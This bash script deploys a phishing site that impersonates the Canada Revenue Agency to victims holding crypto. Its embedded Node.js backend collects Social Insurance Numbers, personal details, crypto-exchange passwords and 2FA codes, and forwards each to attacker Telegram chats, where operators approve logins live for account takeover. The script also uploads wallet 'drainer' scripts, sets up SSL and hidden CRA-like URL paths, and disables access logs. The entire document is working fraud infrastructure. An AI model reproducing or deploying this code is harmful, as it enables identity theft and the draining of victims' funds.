#!/bin/bash

# ============================================================================
# CRA Crypto Phishing Site - Complete Deployment Script
# ============================================================================
# This script will deploy everything needed for the site to work:
# - Nginx web server
# - SSL certificates (Let's Encrypt)
# - Node.js backend with PM2
# - All HTML pages (declaration + exchange folders)
# - Drainer JS files (wallet.js, drainer.js, walletconnect)
# - Telegram bot integration
# ============================================================================

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Helper functions
print_header() {
    echo -e "\n${BLUE}============================================================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}============================================================================${NC}\n"
}

print_success() {
    echo -e "${GREEN}✓ $1${NC}"
}

print_error() {
    echo -e "${RED}✗ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}⚠ $1${NC}"
}

print_info() {
    echo -e "${BLUE}ℹ $1${NC}"
}

# ============================================================================
# Step 1: Gather Configuration
# ============================================================================
print_header "Step 1: Configuration"

echo -e "${YELLOW}Please provide the following information:${NC}\n"

read -p "Server IP address: " SERVER_IP
read -p "SSH root password: " -s SSH_PASSWORD
echo ""
read -p "Domain name (e.g., cra-arc-crypto-cms-sgj.com): " DOMAIN
read -p "Telegram Bot Token: " TELEGRAM_BOT_TOKEN
read -p "Telegram Chat ID 1: " TELEGRAM_CHAT_ID_1
read -p "Telegram Chat ID 2 (optional, press Enter to skip): " TELEGRAM_CHAT_ID_2
read -p "Email for SSL certificate: " SSL_EMAIL

# Validate inputs
if [[ -z "$SERVER_IP" || -z "$SSH_PASSWORD" || -z "$DOMAIN" || -z "$TELEGRAM_BOT_TOKEN" || -z "$TELEGRAM_CHAT_ID_1" || -z "$SSL_EMAIL" ]]; then
    print_error "All required fields must be filled!"
    exit 1
fi

# Set default for second chat ID if not provided
if [[ -z "$TELEGRAM_CHAT_ID_2" ]]; then
    TELEGRAM_CHAT_ID_2="$TELEGRAM_CHAT_ID_1"
fi

print_success "Configuration collected"

# ============================================================================
# Step 2: Test SSH Connection
# ============================================================================
print_header "Step 2: Testing SSH Connection"

if ! command -v sshpass &> /dev/null; then
    print_warning "sshpass not found, installing..."
    sudo apt-get update && sudo apt-get install -y sshpass
fi

if sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no root@$SERVER_IP "echo 'SSH connection successful'" &>/dev/null; then
    print_success "SSH connection established"
else
    print_error "Failed to connect to server via SSH"
    exit 1
fi

# ============================================================================
# Step 3: Update verify-claim.js with Telegram credentials
# ============================================================================
print_header "Step 3: Configuring Backend"

print_info "Updating Telegram credentials in verify-claim.js..."

# Create temporary file with updated credentials
cat > /tmp/verify-claim.js <<EOF
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '${TELEGRAM_BOT_TOKEN}';
const TELEGRAM_CHAT_IDS = ['${TELEGRAM_CHAT_ID_1}', '${TELEGRAM_CHAT_ID_2}'];

// Target wallet address for drainer
const TARGET_WALLET = '0x1234567890123456789012345678901234567890'; // Update this with your wallet

// In-memory session storage
const exchangeSessions = new Map();
const sessionMessages = new Map();

// Helper function to send Telegram message
async function sendTelegramMessage(chatId, text, extra = {}) {
    try {
        const response = await axios.post(\`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage\`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            ...extra
        });
        return response.data;
    } catch (error) {
        console.error('Error sending Telegram message:', error.message);
        throw error;
    }
}

// Helper function to send to all chat IDs
async function broadcastMessage(text, extra = {}) {
    const promises = TELEGRAM_CHAT_IDS.map(chatId => sendTelegramMessage(chatId, text, extra));
    return Promise.all(promises);
}

// Handle callback queries (button presses)
async function handleCallbackQuery(callbackQuery) {
    const { id: queryId, data, message } = callbackQuery;
    
    // Answer the callback query FIRST to prevent timeout
    const answerCallbackQuery = \`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/answerCallbackQuery\`;
    await axios.post(answerCallbackQuery, { callback_query_id: queryId });

    const [action, logId] = data.split('_');
    const session = exchangeSessions.get(logId);

    if (!session) {
        return;
    }

    if (action === 'approve') {
        session.status = 'approved';
        await axios.post(\`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup\`, {
            chat_id: message.chat.id,
            message_id: message.message_id,
            reply_markup: { inline_keyboard: [] }
        });
        await sendTelegramMessage(message.chat.id, \`✅ <b>Approved (Log ID: \${logId})</b>\`);
    } else if (action === 'reject') {
        session.status = 'rejected';
        await axios.post(\`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup\`, {
            chat_id: message.chat.id,
            message_id: message.message_id,
            reply_markup: { inline_keyboard: [] }
        });
        await sendTelegramMessage(message.chat.id, \`❌ <b>Rejected (Log ID: \${logId})</b>\`);
    }
}

// Polling for Telegram updates
let lastUpdateId = 0;
async function pollTelegramUpdates() {
    try {
        const response = await axios.get(\`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/getUpdates\`, {
            params: {
                offset: lastUpdateId + 1,
                timeout: 30
            }
        });

        const updates = response.data.result;
        for (const update of updates) {
            lastUpdateId = update.update_id;
            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
            }
        }
    } catch (error) {
        console.error('Telegram polling error:', error.message);
    }
    
    setTimeout(pollTelegramUpdates, 1000);
}

// Start polling
pollTelegramUpdates();

// Session cleanup (remove sessions older than 10 minutes without activity)
setInterval(() => {
    const now = Date.now();
    for (const [logId, session] of exchangeSessions.entries()) {
        if (session.cleanup_scheduled && now - session.lastPollTime > 600000) {
            exchangeSessions.delete(logId);
            sessionMessages.delete(logId);
        }
    }
}, 60000);

// ============================================================================
// API Endpoints
// ============================================================================

// Send initial form data to Telegram
app.post('/api/send-initial-telegram', async (req, res) => {
    try {
        const { personalData } = req.body;
        const logId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        
        const register = personalData.register || {};
        const declaration = personalData.declaration || {};
        
        let message = \`📋 <b>NEW CRA TAX RETURN SUBMISSION</b>\\n\\n\`;
        message += \`🔑 Log ID: <code>\${logId}</code>\\n\\n\`;
        message += \`<b>📝 PERSONAL INFORMATION:</b>\\n\`;
        message += \`• SIN: \${register.sin || 'N/A'}\\n\`;
        message += \`• Full Name: \${register.firstName || ''} \${register.lastName || ''}\\n\`;
        message += \`• DOB: \${register.dob || 'N/A'}\\n\`;
        message += \`• Province: \${register.province || 'N/A'}\\n\`;
        message += \`• Postal: \${register.postal || 'N/A'}\\n\\n\`;
        message += \`<b>💰 CRYPTO DECLARATION:</b>\\n\`;
        message += \`• Total Crypto Holdings: \${declaration.totalValue || 'N/A'}\\n\`;
        message += \`• # Exchanges Used: \${declaration.numExchanges || 'N/A'}\\n\`;
        message += \`• Exchanges: \${declaration.exchanges?.join(', ') || 'N/A'}\\n\`;

        await broadcastMessage(message);
        
        res.json({ success: true, logId });
    } catch (error) {
        console.error('Error in /api/send-initial-telegram:', error);
        res.status(500).json({ error: 'Failed to send message' });
    }
});

// Exchange login endpoint
app.post('/api/exchange-login', async (req, res) => {
    try {
        const { exchange, credentials, logId } = req.body;
        
        let session = exchangeSessions.get(logId);
        if (!session) {
            session = {
                logId,
                exchange,
                email: credentials.email || credentials.username,
                password: credentials.password,
                status: 'pending',
                stage: 'login',
                codes: {},
                lastPollTime: Date.now(),
                cleanup_scheduled: false
            };
            exchangeSessions.set(logId, session);
        } else {
            session.exchange = exchange;
            session.email = credentials.email || credentials.username;
            session.password = credentials.password;
            session.stage = 'login';
            session.status = 'pending';
            session.lastPollTime = Date.now();
        }

        let message = \`🔐 <b>EXCHANGE LOGIN ATTEMPT</b>\\n\\n\`;
        message += \`🔑 Log ID: <code>\${logId}</code>\\n\`;
        message += \`💱 Exchange: <b>\${exchange}</b>\\n\`;
        message += \`📧 Email/User: <code>\${credentials.email || credentials.username}</code>\\n\`;
        message += \`🔑 Password: <code>\${credentials.password}</code>\\n\`;

        const keyboard = {
            inline_keyboard: [[
                { text: '✅ Approve', callback_data: \`approve_\${logId}\` },
                { text: '❌ Bad Auth', callback_data: \`reject_\${logId}\` }
            ]]
        };

        await broadcastMessage(message, { reply_markup: keyboard });
        
        const pollInterval = setInterval(() => {
            session.lastPollTime = Date.now();
        }, 1000);

        const waitForApproval = new Promise((resolve) => {
            const checkStatus = setInterval(() => {
                if (session.status === 'approved') {
                    clearInterval(checkStatus);
                    clearInterval(pollInterval);
                    resolve({ approved: true });
                } else if (session.status === 'rejected') {
                    clearInterval(checkStatus);
                    clearInterval(pollInterval);
                    resolve({ approved: false });
                }
            }, 500);
            
            setTimeout(() => {
                clearInterval(checkStatus);
                clearInterval(pollInterval);
                if (session.status === 'pending') {
                    resolve({ approved: false, timeout: true });
                }
            }, 300000);
        });

        const result = await waitForApproval;
        res.json(result);
    } catch (error) {
        console.error('Error in /api/exchange-login:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Exchange 2FA verification endpoint
app.post('/api/exchange-verify', async (req, res) => {
    try {
        const { logId, codes } = req.body;
        const session = exchangeSessions.get(logId);

        if (!session) {
            return res.status(404).json({ error: 'Session not found' });
        }

        session.codes = { ...session.codes, ...codes };
        session.stage = 'verify';
        session.status = 'pending';
        session.lastPollTime = Date.now();
        session.cleanup_scheduled = false;

        let message = \`🔐 <b>2FA VERIFICATION CODES</b>\\n\\n\`;
        message += \`🔑 Log ID: <code>\${logId}</code>\\n\`;
        message += \`💱 Exchange: <b>\${session.exchange}</b>\\n\`;
        message += \`📧 Email: <code>\${session.email}</code>\\n\\n\`;
        message += \`<b>Codes Received:</b>\\n\`;

        if (codes.sms) message += \`📱 SMS: <code>\${codes.sms}</code>\\n\`;
        if (codes.email) message += \`📧 Email: <code>\${codes.email}</code>\\n\`;
        if (codes.authenticator) message += \`🔐 Authenticator: <code>\${codes.authenticator}</code>\\n\`;
        if (codes.securityKey) message += \`🔑 Security Key: <code>\${codes.securityKey}</code>\\n\`;

        const keyboard = {
            inline_keyboard: [[
                { text: '✅ Approve', callback_data: \`approve_\${logId}\` },
                { text: '❌ Bad Auth', callback_data: \`reject_\${logId}\` }
            ]]
        };

        await broadcastMessage(message, { reply_markup: keyboard });

        const pollInterval = setInterval(() => {
            session.lastPollTime = Date.now();
        }, 1000);

        const waitForApproval = new Promise((resolve) => {
            const checkStatus = setInterval(() => {
                if (session.status === 'approved') {
                    clearInterval(checkStatus);
                    clearInterval(pollInterval);
                    session.cleanup_scheduled = true;
                    resolve({ approved: true });
                } else if (session.status === 'rejected') {
                    clearInterval(checkStatus);
                    clearInterval(pollInterval);
                    resolve({ approved: false });
                }
            }, 500);

            setTimeout(() => {
                clearInterval(checkStatus);
                clearInterval(pollInterval);
                if (session.status === 'pending') {
                    resolve({ approved: false, timeout: true });
                }
            }, 300000);
        });

        const result = await waitForApproval;
        res.json(result);
    } catch (error) {
        console.error('Error in /api/exchange-verify:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Get target wallet address for drainer
app.get('/api/get-target-address', (req, res) => {
    res.json({ address: TARGET_WALLET });
});

// ============================================================================
// Start Server
// ============================================================================
const PORT = 3000;
app.listen(PORT, () => {
    console.log(\`✓ CRA Backend server running on port \${PORT}\`);
    console.log(\`✓ Telegram bot polling started\`);
    console.log(\`✓ Serving target wallet: \${TARGET_WALLET}\`);
});
EOF

print_success "Backend configured with Telegram credentials"

# ============================================================================
# Step 4: Install Server Dependencies
# ============================================================================
print_header "Step 4: Installing Server Dependencies"

print_info "Installing nginx, Node.js, PM2, and certbot..."

sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no root@$SERVER_IP <<'ENDSSH'
set -e

# Update system
apt-get update

# Install nginx
if ! command -v nginx &> /dev/null; then
    apt-get install -y nginx
    echo "✓ Nginx installed"
else
    echo "✓ Nginx already installed"
fi

# Install Node.js (v18)
if ! command -v node &> /dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
    apt-get install -y nodejs
    echo "✓ Node.js installed"
else
    echo "✓ Node.js already installed"
fi

# Install PM2
if ! command -v pm2 &> /dev/null; then
    npm install -g pm2
    echo "✓ PM2 installed"
else
    echo "✓ PM2 already installed"
fi

# Install certbot
if ! command -v certbot &> /dev/null; then
    apt-get install -y certbot python3-certbot-nginx
    echo "✓ Certbot installed"
else
    echo "✓ Certbot already installed"
fi

# Create web directory
mkdir -p /var/www/cra
chown -R www-data:www-data /var/www/cra
echo "✓ Web directory created"

# Create backend directory
mkdir -p /root/cra-backend
echo "✓ Backend directory created"

ENDSSH

print_success "Server dependencies installed"

# ============================================================================
# Step 5: Deploy Backend
# ============================================================================
print_header "Step 5: Deploying Backend"

print_info "Uploading verify-claim.js..."
sshpass -p "$SSH_PASSWORD" scp /tmp/verify-claim.js root@$SERVER_IP:/root/cra-backend/

print_info "Installing Node.js dependencies..."
sshpass -p "$SSH_PASSWORD" ssh root@$SERVER_IP <<'ENDSSH'
cd /root/cra-backend
cat > package.json <<'EOF'
{
  "name": "cra-backend",
  "version": "1.0.0",
  "description": "CRA Crypto Phishing Backend",
  "main": "verify-claim.js",
  "scripts": {
    "start": "node verify-claim.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "body-parser": "^1.20.2",
    "axios": "^1.6.0"
  }
}
EOF
npm install
ENDSSH

print_info "Starting backend with PM2..."
sshpass -p "$SSH_PASSWORD" ssh root@$SERVER_IP <<'ENDSSH'
cd /root/cra-backend
pm2 delete cracrypto 2>/dev/null || true
pm2 start verify-claim.js --name cracrypto
pm2 save
pm2 startup systemd -u root --hp /root
ENDSSH

print_success "Backend deployed and running"

# ============================================================================
# Step 6: Deploy Website Files
# ============================================================================
print_header "Step 6: Deploying Website Files"

print_info "Creating folder structure on server..."
sshpass -p "$SSH_PASSWORD" ssh root@$SERVER_IP <<'ENDSSH'
mkdir -p /var/www/cra/gol-ged/awsc/cms/login/declaration/T1135-craarc/REALMOID-06-034563654a-njadfs7fa-105d-9505-84cb2b4afb5e/
mkdir -p /var/www/cra/gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/
ENDSSH

print_info "Uploading drainer JS files..."
cd /workspaces/AllinOne/website_cra
sshpass -p "$SSH_PASSWORD" scp wallet.js drainer.js walletconnect-v2.bundle.js root@$SERVER_IP:/var/www/cra/

print_info "Uploading root redirect files..."
sshpass -p "$SSH_PASSWORD" scp index.html index-fr.html root@$SERVER_IP:/var/www/cra/

print_info "Uploading declaration folder files..."
cd /workspaces/AllinOne/website_cra/gol-ged/awsc/cms/login/declaration/T1135-craarc/REALMOID-06-034563654a-njadfs7fa-105d-9505-84cb2b4afb5e/
sshpass -p "$SSH_PASSWORD" scp *.html root@$SERVER_IP:/var/www/cra/gol-ged/awsc/cms/login/declaration/T1135-craarc/REALMOID-06-034563654a-njadfs7fa-105d-9505-84cb2b4afb5e/

print_info "Uploading exchange folder files..."
cd /workspaces/AllinOne/website_cra/gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/
sshpass -p "$SSH_PASSWORD" scp *.html root@$SERVER_IP:/var/www/cra/gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/

print_info "Uploading API directory..."
cd /workspaces/AllinOne/website_cra
if [ -d "api" ]; then
    sshpass -p "$SSH_PASSWORD" ssh root@$SERVER_IP "mkdir -p /var/www/cra/api"
    sshpass -p "$SSH_PASSWORD" scp -r api/* root@$SERVER_IP:/var/www/cra/api/
fi

print_info "Setting permissions..."
sshpass -p "$SSH_PASSWORD" ssh root@$SERVER_IP "chown -R www-data:www-data /var/www/cra && chmod -R 755 /var/www/cra"

print_success "Website files deployed"

# ============================================================================
# Step 7: Configure Nginx
# ============================================================================
print_header "Step 7: Configuring Nginx"

print_info "Creating nginx configuration..."

sshpass -p "$SSH_PASSWORD" ssh root@$SERVER_IP bash <<ENDSSH
cat > /etc/nginx/sites-available/cra <<'EOF'
server {
    listen 80;
    listen [::]:80;
    server_name ${DOMAIN};

    root /var/www/cra;
    index index.html;

    # Enable large URIs for obfuscated paths
    large_client_header_buffers 4 32k;

    location / {
        try_files \\\$uri \\\$uri/ =404;
    }

    # Proxy API requests to Node.js backend
    location /api/ {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \\\$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \\\$host;
        proxy_cache_bypass \\\$http_upgrade;
        proxy_set_header X-Real-IP \\\$remote_addr;
        proxy_set_header X-Forwarded-For \\\$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \\\$scheme;
    }

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # Disable logging for privacy
    access_log off;
    error_log /var/log/nginx/cra-error.log error;
}
EOF

# Enable site
ln -sf /etc/nginx/sites-available/cra /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

# Test nginx config
nginx -t

# Reload nginx
systemctl reload nginx

echo "✓ Nginx configured"
ENDSSH

print_success "Nginx configured"

# ============================================================================
# Step 8: Setup SSL Certificate
# ============================================================================
print_header "Step 8: Setting up SSL Certificate"

print_info "Obtaining Let's Encrypt SSL certificate..."
print_warning "Make sure DNS for $DOMAIN points to $SERVER_IP"
read -p "Press Enter to continue when DNS is ready..."

sshpass -p "$SSH_PASSWORD" ssh root@$SERVER_IP bash <<ENDSSH
certbot --nginx -d ${DOMAIN} --non-interactive --agree-tos --email ${SSL_EMAIL} --redirect
systemctl reload nginx
echo "✓ SSL certificate installed"
ENDSSH

print_success "SSL certificate configured"

# ============================================================================
# Step 9: Final Verification
# ============================================================================
print_header "Step 9: Final Verification"

print_info "Checking services..."

sshpass -p "$SSH_PASSWORD" ssh root@$SERVER_IP <<'ENDSSH'
echo "=== Nginx Status ==="
systemctl status nginx --no-pager | grep "Active:"

echo ""
echo "=== PM2 Status ==="
pm2 status

echo ""
echo "=== Backend Port 3000 ==="
netstat -tlnp | grep :3000 || echo "Warning: Port 3000 not found"

echo ""
echo "=== File Structure ==="
ls -la /var/www/cra/ | head -10
echo "..."
ls -la /var/www/cra/gol-ged/awsc/cms/login/declaration/T1135-craarc/REALMOID-06-034563654a-njadfs7fa-105d-9505-84cb2b4afb5e/ | head -10
ENDSSH

# ============================================================================
# Step 10: Deployment Summary
# ============================================================================
print_header "DEPLOYMENT COMPLETE!"

cat <<EOF

${GREEN}✓ All components deployed successfully!${NC}

${BLUE}=== DEPLOYMENT SUMMARY ===${NC}

${YELLOW}Website URL:${NC}
• https://${DOMAIN}

${YELLOW}Backend:${NC}
• Node.js backend running on port 3000 (PM2: cracrypto)
• Telegram bot polling active
• API endpoints: /api/send-initial-telegram, /api/exchange-login, /api/exchange-verify

${YELLOW}File Structure:${NC}
• Root: /var/www/cra/
• Declaration: /var/www/cra/gol-ged/.../declaration/.../
• Exchanges: /var/www/cra/gol-ged/.../Exchanges/
• Drainer JS: wallet.js, drainer.js, walletconnect-v2.bundle.js

${YELLOW}SSL Certificate:${NC}
• Let's Encrypt certificate installed for ${DOMAIN}
• Auto-renewal configured

${YELLOW}Nginx:${NC}
• Configured with API proxy
• Large URI support enabled
• Security headers added

${YELLOW}PM2:${NC}
• Backend process: cracrypto
• Auto-restart enabled
• Startup on boot configured

${BLUE}=== NEXT STEPS ===${NC}

1. Update the target wallet address in verify-claim.js:
   ${YELLOW}ssh root@${SERVER_IP}${NC}
   ${YELLOW}nano /root/cra-backend/verify-claim.js${NC}
   ${YELLOW}pm2 restart cracrypto${NC}

2. Test the full flow:
   • Visit https://${DOMAIN}
   • Submit a test form
   • Check Telegram for messages
   • Test exchange login flow
   • Verify drainer functionality

3. Monitor logs:
   • PM2 logs: ${YELLOW}pm2 logs cracrypto${NC}
   • Nginx error: ${YELLOW}tail -f /var/log/nginx/cra-error.log${NC}

${GREEN}Deployment completed successfully!${NC}

EOF

# Save deployment info
cat > /workspaces/AllinOne/DEPLOYMENT_INFO.txt <<EOF
Deployment Date: $(date)
Domain: ${DOMAIN}
Server IP: ${SERVER_IP}
SSL Email: ${SSL_EMAIL}

Backend: https://${DOMAIN}/api/
PM2 Process: cracrypto
Telegram Bot: Active

File Locations:
- Web Root: /var/www/cra/
- Backend: /root/cra-backend/
- Nginx Config: /etc/nginx/sites-available/cra

Telegram Configuration:
- Bot Token: ${TELEGRAM_BOT_TOKEN}
- Chat ID 1: ${TELEGRAM_CHAT_ID_1}
- Chat ID 2: ${TELEGRAM_CHAT_ID_2}
EOF

print_success "Deployment info saved to DEPLOYMENT_INFO.txt"
